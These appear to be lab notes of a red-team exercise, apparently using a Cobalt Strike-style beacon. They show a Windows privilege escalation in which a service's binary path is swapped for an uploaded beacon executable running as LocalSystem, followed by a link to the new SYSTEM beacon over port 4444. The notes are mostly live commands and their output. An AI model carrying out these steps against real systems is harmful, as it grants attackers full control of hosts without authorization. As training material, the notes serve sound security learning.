
upload `tcp-localhost_x64.svc.exe`
![[Pasted image 20240217191146.png]]
changing executable path of `svc_test`
```powershell
[02/18 00:12:15] beacon> run sc config svc_test binPath= C:\Windows\Tasks\tcp-localhost_x64.svc.exe
[02/18 00:12:15] [*] Tasked beacon to run: sc config svc_test binPath= C:\Windows\Tasks\tcp-localhost_x64.svc.exe
[02/18 00:12:20] [+] host called home, sent: 88 bytes
[02/18 00:12:20] [+] received output:
[SC] ChangeServiceConfig SUCCESS

```
checking to make sure the path was changed 
```powershell
[02/18 00:12:34] beacon> run sc qc svc_test
[02/18 00:12:34] [*] Tasked beacon to run: sc qc svc_test
[02/18 00:12:35] [+] host called home, sent: 32 bytes
[02/18 00:12:35] [+] received output:
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: svc_test
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\Tasks\tcp-localhost_x64.svc.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : svc_test
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```
netstat before executing the `svc_test`
![[Pasted image 20240217191418.png]]
started `svc_test`
```powershell
[02/18 00:14:29] beacon> run sc start svc_test
[02/18 00:14:29] [*] Tasked beacon to run: sc start svc_test
[02/18 00:14:29] [+] host called home, sent: 35 bytes
[02/18 00:14:30] [+] received output:

SERVICE_NAME: svc_test 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 2  START_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 4188
        FLAGS              : 
```
now `4444` is listening
```powershell
[02/18 00:14:54] beacon> shell netstat -anp tcp
[02/18 00:14:54] [*] Tasked beacon to run: netstat -anp tcp
[02/18 00:14:59] [+] host called home, sent: 47 bytes
[02/18 00:14:59] [+] received output:

Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49680          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49681          0.0.0.0:0              LISTENING
  TCP    10.10.120.100:139      0.0.0.0:0              LISTENING
  TCP    10.10.120.100:3389     10.10.255.244:46916    ESTABLISHED
  TCP    10.10.120.100:56688    10.10.120.254:3128     CLOSE_WAIT
  TCP    10.10.120.100:56689    10.10.120.254:3128     CLOSE_WAIT
  TCP    10.10.120.100:56770    10.10.120.254:3128     CLOSE_WAIT
  TCP    10.10.120.100:56771    10.10.120.254:3128     CLOSE_WAIT
  TCP    10.10.120.100:56773    10.10.120.254:3128     CLOSE_WAIT
  TCP    10.10.120.100:56774    10.10.120.254:3128     CLOSE_WAIT
  TCP    10.10.120.100:56775    10.10.120.254:3128     CLOSE_WAIT
  TCP    10.10.120.100:56776    10.10.120.254:3128     CLOSE_WAIT
  TCP    10.10.120.100:56873    10.10.120.254:3128     ESTABLISHED
  TCP    127.0.0.1:4444         0.0.0.0:0              LISTENING

```
connect to the port
```powershell
[02/18 00:15:24] beacon> connect localhost 4444
[02/18 00:15:24] [*] Tasked to connect to localhost:4444
[02/18 00:15:24] [+] host called home, sent: 20 bytes
[02/18 00:15:24] [+] established link to child beacon: 10.10.120.100
```